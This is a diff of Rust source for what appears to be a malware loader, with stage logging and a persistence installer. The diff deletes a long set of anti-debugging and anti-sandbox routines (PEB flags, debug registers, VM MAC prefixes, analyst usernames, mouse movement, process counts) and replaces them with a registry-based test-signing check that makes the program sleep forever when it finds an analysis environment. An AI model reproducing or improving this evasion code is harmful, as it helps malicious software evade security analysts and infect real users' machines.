@@ -70,16 +70,14 @@ fn main() {
 
     // 2. Anti-analysis
     log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
-    if loader_cfg.anti_analysis.enabled {
-        log!("[4/10] running sandbox checks...");
-        if is_sandbox(&loader_cfg.anti_analysis)
-            || (loader_cfg.anti_analysis.check_debugger && check_debugger())
-        {
-            log!("[4/10] sandbox/debugger detected — sleeping forever");
+    if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_test_signing {
+        log!("[4/10] checking test signing...");
+        if check_test_signing() {
+            log!("[4/10] test signing detected — sleeping forever");
             std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
             std::process::exit(0);
         }
-        log!("[4/10] sandbox checks passed");
+        log!("[4/10] test signing check passed");
     } else {
         log!("[4/10] anti-analysis disabled, skipping");
     }
@@ -343,445 +341,76 @@ fn install_persistence() {
     }
 }
 
-// ── Anti-analysis (inline, no libra-modules dependency) ───────────────
-
-fn is_sandbox(cfg: &AntiAnalysisConfig) -> bool {
-    (cfg.check_cpu_cores && check_cpu_cores(cfg.min_cpu_cores))
-        || (cfg.check_memory && check_memory(cfg.min_memory_gb))
-        || (cfg.check_vm_mac && check_vm_mac())
-        || (cfg.check_disk_size && check_disk_size(cfg.min_disk_gb))
-        || (cfg.check_username && check_username())
-        || (cfg.check_usb_history && check_usb_history(cfg.min_usb_devices))
-        || (cfg.check_test_signing && check_test_signing())
-        || (cfg.check_delay_sandbox && check_delay_sandbox(cfg.delay_seconds))
-        || (cfg.check_installed_software && check_installed_software(cfg.min_installed_software))
-        || (cfg.check_screen_resolution && check_screen_resolution())
-        || (cfg.check_process_count && check_process_count(cfg.min_processes))
-        || (cfg.check_mouse_movement && check_mouse_movement(cfg.mouse_wait_seconds))
-}
-
-fn check_cpu_cores(min_cores: u32) -> bool {
-    match std::thread::available_parallelism() {
-        Ok(n) => (n.get() as u32) < min_cores,
-        Err(_) => false,
-    }
-}
-
-fn check_memory(min_gb: u32) -> bool {
-    use sysinfo::System;
-    let sys = System::new_with_specifics(
-        sysinfo::RefreshKind::nothing()
-            .with_memory(sysinfo::MemoryRefreshKind::everything()),
-    );
-    let total_mb = sys.total_memory() / (1024 * 1024);
-    total_mb < (min_gb as u64 * 1024)
-}
-
-// ── Anti-debug ────────────────────────────────────────────────────────
-
-fn check_debugger() -> bool {
-    #[cfg(target_os = "windows")]
-    {
-        check_peb_being_debugged()
-            || check_nt_global_flag()
-            || check_hardware_breakpoints()
-            || check_remote_debugger()
-    }
-    #[cfg(not(target_os = "windows"))]
-    {
-        check_ptrace_traceme() || check_tracer_pid()
-    }
-}
-
-/// PEB->BeingDebugged (byte at PEB+0x2): set to 1 when process is debugged.
-#[cfg(target_os = "windows")]
-fn check_peb_being_debugged() -> bool {
-    unsafe {
-        let peb: *const u8;
-        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
-        if peb.is_null() { return false; }
-        *(peb.add(2)) != 0
-    }
-}
-
-
-
-/// PEB->NtGlobalFlag: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
-/// Set by default when a process is started under a debugger.
-#[cfg(target_os = "windows")]
-fn check_nt_global_flag() -> bool {
-    unsafe {
-        // Read PEB via TEB (gs:0x60 on x64)
-        let peb: *const u8;
-        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
-        if peb.is_null() {
-            return false;
-        }
-        // NtGlobalFlag is at PEB+0xBC on x64
-        let nt_global_flag = *(peb.add(0xBC) as *const u32);
-        const FLG_HEAP_ENABLE_TAIL_CHECK: u32 = 0x10;
-        const FLG_HEAP_ENABLE_FREE_CHECK: u32 = 0x20;
-        const FLG_HEAP_VALIDATE_PARAMETERS: u32 = 0x40;
-        nt_global_flag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) != 0
-    }
-}
-
-/// Check hardware breakpoints by reading DR0-DR3 via GetThreadContext.
-/// Debuggers set hardware breakpoints by writing to debug registers.
-#[cfg(target_os = "windows")]
-fn check_hardware_breakpoints() -> bool {
-    use std::mem;
-
-    #[repr(C, align(16))]
-    struct Context64 {
-        _p1_home: u64, _p2_home: u64, _p3_home: u64, _p4_home: u64,
-        _p5_home: u64, _p6_home: u64, _context_flags: u32,
-        _mx_csr: u32,
-        _seg_cs: u16, _seg_ds: u16, _seg_es: u16, _seg_fs: u16, _seg_gs: u16, _seg_ss: u16,
-        _eflags: u32, _dr0: u64, _dr1: u64, _dr2: u64, _dr3: u64,
-        _dr6: u64, _dr7: u64,
-        _rax: u64, _rcx: u64, _rdx: u64, _rbx: u64,
-        _rsp: u64, _rbp: u64, _rsi: u64, _rdi: u64,
-        _r8: u64, _r9: u64, _r10: u64, _r11: u64,
-        _r12: u64, _r13: u64, _r14: u64, _r15: u64,
-        _rip: u64,
-        // ... rest omitted, we only need Dr0-Dr3
-    }
-
-    extern "system" {
-        fn GetThreadContext(hthread: *mut std::ffi::c_void, lpcontext: *mut Context64) -> i32;
-        fn GetCurrentThread() -> *mut std::ffi::c_void;
-    }
-
-    unsafe {
-        let mut ctx: Context64 = mem::zeroed();
-        // CONTEXT_DEBUG_REGISTERS = 0x00100010
-        // CONTEXT_ALL = 0x0010001F (we need DR flags)
-        ctx._context_flags = 0x00100010;
-        if GetThreadContext(GetCurrentThread(), &mut ctx) != 0 {
-            // If any debug register is set, a debugger is present
-            return ctx._dr0 != 0 || ctx._dr1 != 0 || ctx._dr2 != 0 || ctx._dr3 != 0;
-        }
-        false
-    }
-}
-
-/// Check IsDebuggerPresent and NtQueryInformationProcess(DebugPort)
-#[cfg(target_os = "windows")]
-fn check_remote_debugger() -> bool {
-    unsafe {
-        extern "system" {
-            fn IsDebuggerPresent() -> i32;
-            fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
-            fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
-        }
-
-        if IsDebuggerPresent() != 0 {
-            return true;
-        }
-
-        // NtQueryInformationProcess(ProcessDebugPort = 7)
-        type NtQIP = unsafe extern "system" fn(
-            *mut std::ffi::c_void, u32, *mut u8, u32, *mut u32,
-        ) -> i32;
-
-        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
-        if ntdll.is_null() {
-            return false;
-        }
-        let proc = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr());
-        if proc.is_null() {
-            return false;
-        }
-        let nt_query: NtQIP = std::mem::transmute(proc);
-        let mut debug_port: usize = 0;
-        // ProcessDebugPort = 7
-        let status = nt_query(
-            std::ptr::null_mut(),
-            7,
-            &mut debug_port as *mut usize as *mut u8,
-            std::mem::size_of::<usize>() as u32,
-            std::ptr::null_mut(),
-        );
-        status == 0 && debug_port != 0
-    }
-}
-
-/// Linux: check if /proc/self/status shows TracerPid != 0
-#[cfg(target_os = "linux")]
-fn check_tracer_pid() -> bool {
-    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
-        for line in status.lines() {
-            if line.starts_with("TracerPid:") {
-                let pid_str = line["TracerPid:".len()..].trim();
-                if let Ok(pid) = pid_str.parse::<u32>() {
-                    return pid != 0;
-                }
-            }
-        }
-    }
-    false
-}
-
-/// Linux: try ptrace(PTRACE_TRACEME) — fails if already traced
-#[cfg(target_os = "linux")]
-fn check_ptrace_traceme() -> bool {
-    const PTRACE_TRACEME: i64 = 0;
-    unsafe {
-        // If we're already being traced, ptrace returns -1
-        libc::ptrace(PTRACE_TRACEME, 0, 0, 0) == -1
-    }
-}
-
-// ── VM / sandbox environment checks ───────────────────────────────────
-
-/// Check if any network adapter MAC prefix matches known VM vendors.
-/// VMware: 00:0C:29, 00:50:56 | VirtualBox: 08:00:27 | Hyper-V: 00:15:5D
-fn check_vm_mac() -> bool {
-    #[cfg(target_os = "windows")]
-    {
-        use std::os::windows::process::CommandExt;
-        if let Ok(output) = std::process::Command::new("wmic")
-            .args(["nic", "where", "PhysicalAdapter=TRUE", "get", "MACAddress", "/format:csv"])
-            .creation_flags(0x08000000)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::null())
-            .output()
-        {
-            let text = String::from_utf8_lossy(&output.stdout);
-            for line in text.lines().skip(2) {
-                if let Some(mac) = line.split(',').last() {
-                    let mac_clean = mac.trim().replace('-', ":").to_lowercase();
-                    if mac_clean.starts_with("00:0c:29")
-                        || mac_clean.starts_with("00:50:56")
-                        || mac_clean.starts_with("08:00:27")
-                        || mac_clean.starts_with("00:15:5d")
-                    {
-                        return true;
-                    }
-                }
-            }
-        }
-        false
-    }
-    #[cfg(target_os = "linux")]
-    {
-        if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
-            for entry in entries.flatten() {
-                let mac_path = entry.path().join("address");
-                if let Ok(mac) = std::fs::read_to_string(&mac_path) {
-                    let mac = mac.trim().to_lowercase();
-                    if mac.starts_with("00:0c:29")
-                        || mac.starts_with("00:50:56")
-                        || mac.starts_with("08:00:27")
-                        || mac.starts_with("00:15:5d")
-                    {
-                        return true;
-                    }
-                }
-            }
-        }
-        false
-    }
-    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-    { false }
-}
-
-/// Check if the system disk is smaller than 60 GB (typical VM/sandbox).
-fn check_disk_size(min_gb: u32) -> bool {
-    use sysinfo::Disks;
-    let disks = Disks::new_with_refreshed_list();
-    let total: u64 = disks.iter().map(|d| d.total_space()).sum();
-    total < (min_gb as u64) * 1024 * 1024 * 1024
-}
-
-/// Check if the current username matches known sandbox/analysis names.
-fn check_username() -> bool {
-    let username = std::env::var("USERNAME")
-        .or_else(|_| std::env::var("USER"))
-        .unwrap_or_default()
-        .to_lowercase();
-
-    const SUSPICIOUS_NAMES: &[&str] = &[
-        "admin", "administrator", "malware", "maltest", "sandbox",
-        "user", "test", "virus", "sample", "john", "abc",
-        "cuckoo", "cape", "vbox", "vmware", "honey",
-        "analyst", "analysis", "lab", "researcher",
-    ];
-
-    for name in SUSPICIOUS_NAMES {
-        if username == *name {
-            return true;
-        }
-    }
-    false
-}
-
-/// Check USB device history count via registry.
-fn check_usb_history(min_devices: u32) -> bool {
-    #[cfg(target_os = "windows")]
-    {
-        use std::os::windows::process::CommandExt;
-        if let Ok(output) = std::process::Command::new("reg")
-            .args(["query", r"HKLM\SYSTEM\ControlSet001\Enum\USBSTOR"])
-            .creation_flags(0x08000000)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::null())
-            .output()
-        {
-            let text = String::from_utf8_lossy(&output.stdout);
-            let subkey_count = text.lines()
-                .filter(|l| l.trim().starts_with("HKEY_LOCAL_MACHINE"))
-                .count();
-            return (subkey_count as u32) < min_devices;
-        }
-        false
-    }
-    #[cfg(not(target_os = "windows"))]
-    { let _ = min_devices; false }
-}
+// ── Anti-analysis: Test Signing check only ─────────────────────────────
 
 /// Check if Windows Test Signing mode is enabled (common in analysis environments).
+/// Reads HKLM\SYSTEM\CurrentControlSet\Control\SystemStartOptions for TESTSIGNING.
 fn check_test_signing() -> bool {
     #[cfg(target_os = "windows")]
     {
-        use std::os::windows::process::CommandExt;
-        if let Ok(output) = std::process::Command::new("bcdedit")
-            .args(["/enum", "{current}"])
-            .creation_flags(0x08000000)
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::null())
-            .output()
-        {
-            let text = String::from_utf8_lossy(&output.stdout).to_lowercase();
-            return text.contains("testsigning") && text.contains("yes");
-        }
-        false
-    }
-    #[cfg(not(target_os = "windows"))]
-    { false }
-}
+        use std::iter;
 
-/// Delay-based anti-sandbox: sleep for N seconds, verify elapsed time matches.
-/// Sandboxes often fast-forward or skip sleep calls.
-fn check_delay_sandbox(delay_seconds: u32) -> bool {
-    let before = std::time::Instant::now();
-    std::thread::sleep(std::time::Duration::from_secs(delay_seconds as u64));
-    let elapsed = before.elapsed().as_secs();
-    elapsed < (delay_seconds as u64).saturating_sub(1)
-}
-
-/// Check installed software count via registry Uninstall keys.
-/// Real machines typically have 50+ entries; sandboxes have very few.
-fn check_installed_software(min_count: u32) -> bool {
-    #[cfg(target_os = "windows")]
-    {
-        use std::os::windows::process::CommandExt;
-        let paths = [
-            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-            r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
-        ];
-        let mut total = 0u32;
-        for path in paths {
-            if let Ok(output) = std::process::Command::new("reg")
-                .args(["query", path])
-                .creation_flags(0x08000000)
-                .stdout(std::process::Stdio::piped())
-                .stderr(std::process::Stdio::null())
-                .output()
-            {
-                let text = String::from_utf8_lossy(&output.stdout);
-                total += text.lines()
-                    .filter(|l| l.trim().starts_with("HKEY_"))
-                    .count() as u32;
-            }
-        }
-        total < min_count
-    }
-    #[cfg(not(target_os = "windows"))]
-    { let _ = min_count; false }
-}
-
-/// Check screen resolution — sandboxes often use low/unusual resolutions like 1024x768.
-fn check_screen_resolution() -> bool {
-    #[cfg(target_os = "windows")]
-    {
         extern "system" {
-            fn GetSystemMetrics(nIndex: i32) -> i32;
+            fn RegOpenKeyExW(
+                hkey: isize, subkey: *const u16, options: u32, sam: u32, result: *mut isize,
+            ) -> i32;
+            fn RegQueryValueExW(
+                hkey: isize, name: *const u16, reserved: *const u8, kind: *mut u32,
+                data: *mut u8, len: *mut u32,
+            ) -> i32;
+            fn RegCloseKey(hkey: isize) -> i32;
         }
-        const SM_CXSCREEN: i32 = 0;
-        const SM_CYSCREEN: i32 = 1;
-        unsafe {
-            let w = GetSystemMetrics(SM_CXSCREEN);
-            let h = GetSystemMetrics(SM_CYSCREEN);
-            // Suspicious: exactly 1024x768, 800x600, or width < 1200
-            w < 1200 || h < 800 || (w == 1024 && h == 768)
-        }
-    }
-    #[cfg(not(target_os = "windows"))]
-    { false }
-}
 
-/// Check running process count — real systems typically have 80+ processes.
-fn check_process_count(min_count: u32) -> bool {
-    #[cfg(target_os = "windows")]
-    {
-        extern "system" {
-            fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> *mut std::ffi::c_void;
-            fn Process32FirstW(hSnapshot: *mut std::ffi::c_void, lppe: *mut [u8; 568]) -> i32;
-            fn Process32NextW(hSnapshot: *mut std::ffi::c_void, lppe: *mut [u8; 568]) -> i32;
-            fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
-        }
-        const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+        const HKEY_LOCAL_MACHINE: isize = 0x80000002;
+        const KEY_READ: u32 = 0x20019;
+        const REG_SZ: u32 = 1;
+        const ERROR_SUCCESS: i32 = 0;
+
+        let subkey: Vec<u16> = "SYSTEM\\CurrentControlSet\\Control"
+            .encode_utf16()
+            .chain(iter::once(0))
+            .collect();
+
+        let value_name: Vec<u16> = "SystemStartOptions"
+            .encode_utf16()
+            .chain(iter::once(0))
+            .collect();
 
         unsafe {
-            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-            if snapshot == -1isize as *mut std::ffi::c_void {
+            let mut hkey: isize = 0;
+            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
                 return false;
             }
-            let mut pe = [0u8; 568];
-            // dwSize at offset 0, u32
-            pe[0..4].copy_from_slice(&568u32.to_le_bytes());
-            let mut count = 0u32;
-            if Process32FirstW(snapshot, &mut pe) != 0 {
-                count += 1;
-                while Process32NextW(snapshot, &mut pe) != 0 {
-                    count += 1;
-                }
+
+            let mut kind: u32 = 0;
+            let mut data_len: u32 = 0;
+
+            if RegQueryValueExW(hkey, value_name.as_ptr(), std::ptr::null(), &mut kind, std::ptr::null_mut(), &mut data_len) != ERROR_SUCCESS {
+                RegCloseKey(hkey);
+                return false;
             }
-            CloseHandle(snapshot);
-            count < min_count
+
+            if kind != REG_SZ || data_len == 0 {
+                RegCloseKey(hkey);
+                return false;
+            }
+
+            let mut buf: Vec<u16> = vec![0u16; (data_len / 2) as usize];
+            let mut actual_len = data_len;
+            if RegQueryValueExW(
+                hkey, value_name.as_ptr(), std::ptr::null(), &mut kind,
+                buf.as_mut_ptr() as *mut u8, &mut actual_len,
+            ) != ERROR_SUCCESS {
+                RegCloseKey(hkey);
+                return false;
+            }
+            RegCloseKey(hkey);
+
+            let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
+            let s = String::from_utf16_lossy(&buf[..end]);
+            s.to_lowercase().contains("testsigning")
         }
     }
     #[cfg(not(target_os = "windows"))]
-    { let _ = min_count; false }
-}
-
-/// Check for real mouse movement within a time window.
-/// If no cursor position change is detected, it's likely a sandbox with no user interaction.
-fn check_mouse_movement(wait_seconds: u32) -> bool {
-    #[cfg(target_os = "windows")]
-    {
-        #[repr(C)]
-        struct POINT { x: i32, y: i32 }
-
-        extern "system" {
-            fn GetCursorPos(lpPoint: *mut POINT) -> i32;
-        }
-
-        unsafe {
-            let mut p1 = POINT { x: 0, y: 0 };
-            GetCursorPos(&mut p1);
-
-            std::thread::sleep(std::time::Duration::from_secs(wait_seconds as u64));
-
-            let mut p2 = POINT { x: 0, y: 0 };
-            GetCursorPos(&mut p2);
-
-            // No movement at all — likely automated
-            p1.x == p2.x && p1.y == p2.y
-        }
-    }
-    #[cfg(not(target_os = "windows"))]
-    { let _ = wait_seconds; false }
+    { false }
 }
